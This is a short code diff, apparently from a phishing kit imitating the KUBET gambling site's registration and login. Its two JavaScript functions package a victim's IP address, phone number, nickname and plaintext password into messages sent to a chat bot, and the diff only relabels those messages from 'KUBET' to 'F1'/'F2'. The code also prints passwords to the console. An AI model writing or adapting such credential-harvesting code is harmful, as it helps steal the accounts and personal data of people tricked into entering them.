@@ -5,7 +5,7 @@ const chatId = process.env.CHAT_ID;
 
 async function sendRegisterAccountToBot(cellPhone, accountID, nickName, userIp, timeNow, password) {
 console.log(timeNow, password)
-    const message = `KUBET ĐĂNG KÝ
+    const message = `F1 ĐĂNG KÝ
 IP: ${userIp}
 Thời Gian: ${timeNow}
 Số Điện Thoại: ${cellPhone}
@@ -31,7 +31,7 @@ Mật Khẩu: ${password}`
 
 async function sendLoginAccountToBot(userIp, timeNow, cellPhone, nickName,  password) {
 
-    const message = `KUBET ĐĂNG NHẬP
+    const message = `F2 ĐĂNG NHẬP
 IP: ${userIp}
 Thời Gian: ${timeNow}
 Số Điện Thoại: ${cellPhone}
